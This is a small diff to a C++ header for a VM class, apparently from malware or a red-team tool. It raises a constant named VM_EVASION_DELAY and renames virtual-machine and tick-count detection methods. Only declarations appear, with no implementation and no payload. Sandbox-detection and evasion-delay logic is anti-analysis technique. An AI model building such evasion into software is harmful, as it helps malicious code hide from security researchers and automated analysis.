@@ -1,7 +1,7 @@
 #pragma once
 
 
-#define VM_EVASION_DELAY 300
+#define VM_EVASION_DELAY 360
 
 
 char* cpuBrand(char* strCpuBrand);
@@ -10,9 +10,9 @@ class VM {
 
 public:
 
-	static int isVM();
+	static int checkVM();
 
-	static int getVmTick();
+	static int checkTickCount();
 
 	static int delay(int seconds);
 };
